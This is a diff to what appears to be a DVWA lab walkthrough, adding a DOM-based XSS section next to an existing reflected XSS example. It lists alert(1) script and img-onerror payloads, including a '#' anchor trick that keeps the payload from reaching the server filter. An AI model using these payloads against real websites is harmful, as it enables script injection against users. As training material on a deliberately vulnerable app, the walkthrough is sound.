@@ -178,3 +178,13 @@ OR
 ### XSS (Reflected)
 
     http://192.168.56.102/DVWA/vulnerabilities/xss_r/?name=%3C/pre%3E%3CScRiPt%3Ealert(1)%3C%2Fscript%3E%3Cpre%3E#
+
+### XSS (DOM)
+
+Payload that ilustrates vulnerability (this time filtering is done on server side so we use anchor '#' to prevent it from sending to the server:
+
+    English#<script>alert(1);</script>
+
+Or do not use 'script' tags:
+
+    English</option></select><img src='x' onerror='alert(1)'>
